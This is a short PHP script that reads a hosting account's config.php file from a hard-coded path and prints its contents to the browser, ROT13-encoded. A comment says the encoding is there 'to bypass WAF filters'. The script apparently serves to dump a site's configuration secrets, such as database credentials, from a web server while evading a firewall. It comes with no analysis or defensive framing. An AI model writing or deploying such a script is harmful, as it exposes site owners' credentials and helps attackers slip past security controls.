<?php
header('Content-Type: text/plain');

$path = '/home/u869064717/config.php';

if (!file_exists($path)) {
    echo "File not found";
    exit;
}

$content = file_get_contents($path);

// Apply ROT13 to bypass WAF filters
echo str_rot13($content);
exit;
